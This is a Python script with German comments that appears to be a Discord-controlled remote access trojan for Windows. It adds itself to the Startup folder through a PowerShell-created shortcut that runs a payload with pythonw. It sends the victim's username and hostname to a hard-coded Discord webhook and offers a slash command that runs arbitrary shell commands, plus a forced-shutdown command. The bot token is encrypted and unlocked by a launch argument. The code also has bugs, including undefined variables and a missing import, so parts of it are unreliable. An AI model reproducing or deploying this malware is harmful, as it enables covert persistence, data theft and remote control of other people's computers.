import sys
import subprocess
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Liste der benötigten Pakete
required_packages = ["discord", "dhooks", "cryptography"]  # Füge hier deine benötigten Module hinzu

# Installiere jedes Paket, wenn es nicht bereits installiert ist
for package in required_packages:
    try:
        __import__(package)
        print(f"{package} ist bereits installiert")
    except ImportError:
        print(f"{package} wird installiert...")
        install(package)
from discord import app_commands
from dhooks import Webhook
from os import system
import socket
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import padding
import base64

def decrypt_string(password, encrypted_data):
    encrypted_data = base64.b64decode(encrypted_data)
    
    # Extrahiere Salt, IV und Cipher Text
    salt = encrypted_data[:16]
    iv = encrypted_data[16:32]
    cipher_text = encrypted_data[32:]
    
    key = derive_key(password, salt)
    
    # AES Entschlüsselung im CBC-Modus
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    
    padded_data = decryptor.update(cipher_text) + decryptor.finalize()
    
    # Entferne Padding
    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    try:
        plain_text = unpadder.update(padded_data) + unpadder.finalize()
        return plain_text.decode()
    except ValueError:
        return "err"



# Initialisiere den Discord-Webhook
hook = Webhook("https://discord.com/api/webhooks/1295417454914179072/lCsBoGB-ntpFbDV6XdlQ8gsgUIAdUSbiOiJJOkjvIuHRQXXtLXRL-g-u4SP9-JZcD5u3")

# Initialisiere Discord-Client und Command-Tree
intents = discord.Intents.default()
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)
result = subprocess.run("whoami", shell=True, capture_output=True, text=True)
output = result.stdout
username_split = output.split("\\")
username = username_split[1]
hostname = username_split[0]
autostartpath = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
targetpath = f"C:\\Users\\{username}\\payload.py"
system(f'powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut(\'{autostartpath}\\comandcon.ink');$s.TargetPath=\'pythonw {targetpath} {argument}';$s.Save()"')
# Beim Starten des Bots wird die IP-Adresse an den Webhook gesendet
@client.event
async def on_ready():
    global username
    global hostname
    await tree.sync(guild=discord.Object(id=1220080097370046607))
    print(f"Bot ist bereit und verbunden als {client.user}")
    hook.send(f'Bot ist Startklar!\nUsername: {username}\nHostname: {hostname}')

# Command für benutzerdefinierte Shell-Eingaben
@tree.command(
    name="runcommand",
    description="Führt ein benutzerdefiniertes Shell-Kommando aus",
    guild=discord.Object(id=1220080097370046607)
)
async def run_command(interaction, command: str):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    output = result.stdout
    await interaction.response.send_message(f'Kommando: {command}\nOutput: {output}')

# Command zum Herunterfahren des Computers
@tree.command(
    name="shutdown",
    description="Fährt den Computer herunter",
    guild=discord.Object(id=1220080097370046607)
)
async def shutdown_command(interaction):
    await interaction.response.send_message("Fahre den Computer herunter...")
    system("shutdown /s /t 0 /f")
    
if len(sys.argv) > 1:
    argument = sys.argv[1]
    print(f"Das übergebene Argument ist: {argument}")
else:
    sys.exit()
token = decrypt_string(argument, "pEt0ACzUovE+6Jcxb5idaoU6kOMaYzWzd8R6VGoU3UhimrGfRU+rdqTBMLgVcWVdJpFJr1xx0n8xGtTPLX3xbsF2BsZowt4x53RYeofblYZmwEq+4gOCqbXLPIVBQKzg4M2JLD1J4GHBqTPcp6Qmcw==")
if decrypted == "err":
    sys.exit()

# Bot starten
client.run(token)
